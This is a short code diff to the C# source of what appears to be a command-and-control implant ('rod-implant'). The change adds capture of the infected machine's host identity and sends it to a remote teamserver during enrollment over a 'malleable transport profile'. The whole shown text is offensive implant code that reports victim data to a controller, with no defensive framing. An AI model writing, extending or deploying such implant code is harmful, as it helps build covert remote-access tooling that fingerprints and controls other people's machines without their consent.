@@ -168,11 +168,14 @@ internal static class ImplantApp
             // The malleable transport profile (architecture.md Sec 7) shapes each
             // attempt: the current entry's host with the profiled enroll path.
             var enrollUrl = Config.ResolveEnrollUrl(egress.CurrentEnrollUrl, config.Transport);
+            // Report the machine once at the first successful attempt's enroll:
+            // the teamserver records it as this implant's device identity.
+            var host = HostIdentity.Capture();
             try
             {
                 log.WriteLine($"rod-implant: enrolling at {enrollUrl}");
                 return await C2.EnrollAsync(
-                    enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, cancellationToken: cancellationToken);
+                    enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, host: host, cancellationToken: cancellationToken);
             }
             catch (C2.EnrollRejectedException)
             {
